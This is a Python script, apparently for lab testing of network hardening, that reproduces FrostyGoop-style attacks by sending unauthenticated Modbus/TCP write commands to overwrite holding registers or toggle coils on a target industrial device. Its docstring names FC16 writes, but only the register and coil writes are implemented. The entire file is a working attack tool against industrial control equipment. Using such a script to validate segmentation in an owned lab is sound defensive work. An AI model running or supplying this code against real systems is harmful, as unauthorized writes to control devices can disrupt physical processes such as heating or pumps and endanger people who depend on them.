#!/usr/bin/env python3
"""
attack_write.py - Unauthorized Modbus write against a target in YOUR OWN lab.

Reproduces the core FrostyGoop behavior: issuing Modbus write function codes
(FC06 write single register, FC05 write single coil, FC16 write multiple
registers) from a host that was never part of the legitimate baseline.

Run this BEFORE hardening (expect success) and AFTER hardening (expect the
connection/write to be rejected at the segmentation or proxy layer).

Usage:
    python3 attack_write.py --target 192.168.100.x --unit 1 --register 0 --value 999
    python3 attack_write.py --target 192.168.100.x --unit 1 --coil 0 --state off
"""
import argparse
from pymodbus.client import ModbusTcpClient


def write_register(client, unit, register, value):
    print(f"[*] Writing register {register} = {value} (FC06)")
    result = client.write_register(register, value, slave=unit)
    if result.isError():
        print(f"[-] Write REJECTED: {result}")
    else:
        print("[+] Write SUCCEEDED - no authorization check enforced by the device")


def write_coil(client, unit, coil, state):
    print(f"[*] Writing coil {coil} = {state} (FC05)")
    result = client.write_coil(coil, state, slave=unit)
    if result.isError():
        print(f"[-] Write REJECTED: {result}")
    else:
        print("[+] Write SUCCEEDED - no authorization check enforced by the device")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Modbus/TCP unauthorized write (lab use only)")
    p.add_argument("--target", required=True, help="Target IP")
    p.add_argument("--unit", type=int, default=1, help="Modbus unit/slave ID")
    p.add_argument("--register", type=int, help="Holding register address to overwrite")
    p.add_argument("--value", type=int, help="Value to write to the register")
    p.add_argument("--coil", type=int, help="Coil address to toggle")
    p.add_argument("--state", choices=["on", "off"], help="Coil state to write")
    args = p.parse_args()

    client = ModbusTcpClient(args.target)
    if not client.connect():
        print(f"[-] Could not connect to {args.target}:502")
        exit(1)

    if args.register is not None and args.value is not None:
        write_register(client, args.unit, args.register, args.value)
    elif args.coil is not None and args.state is not None:
        write_coil(client, args.unit, args.coil, args.state == "on")
    else:
        print("[-] Specify either --register/--value or --coil/--state")

    client.close()
